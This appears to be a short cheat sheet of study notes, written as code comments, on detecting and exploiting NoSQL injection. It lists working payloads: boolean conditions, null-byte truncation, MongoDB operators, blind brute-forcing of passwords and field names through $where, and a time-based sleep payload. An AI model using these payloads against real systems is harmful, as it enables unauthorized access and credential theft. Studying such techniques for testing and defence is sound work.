// NoSQL Injection
//! Identifying
//* using '
// if ' throws and error and \' does not there is a no-sql injection
//! Exploiting
//* simple stuff
// this.category == "fizzy" || "1" == "1";
// this.category == "fizzy" && "1" == "2";
//* ignore the rest with null char
// payload'%00
//* operators
// $where - Matches documents that satisfy a JavaScript expression.
// $ne - Matches all values that are not equal to a specified value.
// $in - Matches all of the values specified in an array.
// $regex - Selects documents where values match a specified regular expression.
//* bure force
// search = f"administrator' && this.password[{i}] == '{char}' || 'a'=='b"
//* explore fields
// see the difference between a field that exists and one that doesn't in here this.foo!='' this.passowrd!=''
//* brute force feilds if blindly
// "$where":"Object.keys(this)[2].match('^.{position}char.*')"
//? note:
// first check if the $where is been evaluated using $where : 0 or 1
//* time based attacks
// {"$where": "sleep(5000)"}
